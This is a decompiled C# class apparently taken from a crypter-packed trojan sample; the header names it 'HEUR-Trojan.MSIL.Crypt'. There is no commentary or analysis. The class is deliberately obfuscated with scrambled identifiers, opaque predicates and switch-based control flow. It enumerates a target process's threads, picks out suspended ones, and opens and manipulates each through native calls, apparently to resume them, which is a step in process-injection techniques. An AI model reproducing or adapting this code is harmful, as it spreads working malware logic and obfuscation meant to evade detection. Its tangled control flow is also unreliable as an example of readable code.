// Decompiled with JetBrains decompiler
// Type: @Ӥ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.Runtime.CompilerServices;

internal sealed class \u0040Ӥ : \u0040Ӡ
{
  private readonly object \u0040ӓ;
  private readonly int \u0040Ӕ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public string B33() => (string) this.\u0040ӓ;

  [SpecialName]
  [MethodImpl(MethodImplOptions.NoInlining)]
  public int zXZ() => this.\u0040Ӕ;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public \u0040Ӥ(string _param1, string _param2, \u0040Ԫ _param3)
  {
    \u0040Ӥ.\u0040Ӧ();
    int num1 = !\u0040Ӥ.\u0040ӥ() ? 2 : 3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 3:
          goto label_1;
        case 1:
        case 2:
          goto label_2;
        case 4:
          goto label_5;
        default:
          num1 = 4;
          continue;
      }
    }
label_1:
    \u0040Ӥ.\u0040ӕ();
label_2:
    \u0040Ӥ.\u0040Ӗ((object) this);
label_5:
    try
    {
      Process process = (Process) \u0040Ӥ.\u0040Ә(\u0040Ӥ.\u0040ӗ((object) _param2));
      if (\u0040Ӥ.\u0040Ӛ(\u0040Ӥ.\u0040ә((object) process), (object) string.Empty))
      {
        IEnumerator enumerator = (IEnumerator) \u0040Ӥ.\u0040Ӝ(\u0040Ӥ.\u0040ӛ((object) process));
        try
        {
          while (\u0040Ӥ.\u0040Ӣ((object) enumerator))
          {
            object obj = \u0040Ӥ.\u0040ӝ((object) enumerator);
            int num2 = 2;
            if (true)
              goto label_18;
label_10:
            int num3;
            bool flag1 = num3 > 0;
            if (\u0040Ӥ.\u0040ӥ())
            {
              num2 = 5;
              goto label_18;
            }
label_11:
            bool flag2;
            if (flag2)
              num2 = 8;
            else
              goto label_31;
label_18:
            IntPtr num4;
            while (true)
            {
              ProcessThread processThread;
              int num5;
              switch (num2)
              {
                case 0:
                  goto label_17;
                case 1:
                  if (\u0040Ӥ.\u0040Ӟ((object) processThread) == ThreadState.Wait)
                  {
                    num2 = 11;
                    continue;
                  }
                  num5 = 0;
                  break;
                case 2:
                  processThread = (ProcessThread) obj;
                  num2 = 1;
                  continue;
                case 3:
                case 6:
                  num4 = \u0040ԝ.\u0040ܗ((\u0040ԛ.\u0040Ӗ.\u0040ӓ) 2, false, (uint) \u0040Ӥ.\u0040Ӡ((object) processThread));
                  num2 = 0;
                  continue;
                case 4:
                case 7:
                  goto label_10;
                case 5:
                  if (!flag1)
                  {
                    num2 = 9;
                    continue;
                  }
                  goto label_28;
                case 8:
                  goto label_27;
                case 9:
                  \u0040ԛ.\u0040ӓ(num4);
                  num2 = 12;
                  continue;
                case 10:
                  goto label_11;
                case 11:
                  num5 = \u0040Ӥ.\u0040ӟ((object) processThread) == ThreadWaitReason.Suspended ? 1 : 0;
                  break;
                case 12:
                  goto label_31;
                default:
                  if (true)
                  {
                    num2 = 10;
                    continue;
                  }
                  goto case 1;
              }
              if (num5 != 0)
              {
                \u0040Ӥ.\u0040Ӧ();
                if (\u0040Ӥ.\u0040ӥ())
                {
                  if (\u0040Ӥ.\u0040ӥ())
                    num2 = 6;
                  else
                    goto label_27;
                }
                else
                  num2 = 4;
              }
              else
                goto label_32;
            }
label_17:
            flag2 = !\u0040Ӥ.\u0040ӡ(num4, IntPtr.Zero);
            goto label_11;
label_27:
label_28:
            num3 = \u0040ԝ.\u0040ױ(num4);
            goto label_10;
label_31:
label_32:;
          }
        }
        finally
        {
          if (enumerator is IDisposable disposable)
            \u0040Ӥ.\u0040ӣ((object) disposable);
        }
      }
      this.\u0040Ӕ = 0;
    }
    catch (Exception ex)
    {
      this.\u0040ӓ = \u0040Ӥ.\u0040Ӥ((object) ex);
      this.\u0040Ӕ = 1;
    }
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ() => \u0040ո.\u0040Ӕ();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040Ӗ(object _param0) => _param0.\u002Ector();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӗ(object _param0) => Convert.ToInt32((string) _param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(int _param0) => (object) Process.GetProcessById(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0) => (object) ((Process) _param0).ProcessName;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӛ(object _param0, object _param1) => (string) _param0 != (string) _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӛ(object _param0) => (object) ((Process) _param0).Threads;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0) => (object) ((ReadOnlyCollectionBase) _param0).GetEnumerator();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӝ(object _param0) => ((IEnumerator) _param0).Current;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static ThreadState \u0040Ӟ(object _param0) => ((ProcessThread) _param0).ThreadState;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static ThreadWaitReason \u0040ӟ(object _param0) => ((ProcessThread) _param0).WaitReason;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӡ(object _param0) => ((ProcessThread) _param0).Id;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӡ(IntPtr _param0, IntPtr _param1) => _param0 == _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӣ(object _param0) => ((IEnumerator) _param0).MoveNext();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӣ(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӥ(object _param0) => (object) ((Exception) _param0).Message;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӥ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӧ() => false;
}
